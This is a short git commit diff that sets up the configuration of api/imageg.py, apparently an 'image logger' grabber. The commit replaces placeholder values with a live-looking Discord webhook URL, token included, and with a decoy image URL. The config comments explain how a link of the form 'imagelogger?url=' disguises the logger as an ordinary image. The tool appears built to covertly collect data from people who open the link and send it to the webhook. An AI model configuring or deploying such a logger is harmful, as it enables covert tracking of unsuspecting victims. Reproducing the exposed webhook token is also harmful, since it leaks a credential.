fdfdc0d5d735ed401ddad96299b5c80b9ce8346f
franciscom1855-stack <franciscom1855@gmail.com>
2025-08-14 18:07:58 -0700

    Update imageg.py

--- api/imageg.py
+++ api/imageg.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1405718931871633508/-MhwgiVILRt0Kv-yIznDQCFXoB9zXpZ4HneGEZsoGWDFZmcohxcosKi50bX1awHNq1ss",
+    "image": "https://i.ebayimg.com/images/g/ZL8AAOSwmbRjZNMO/s-l1600.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
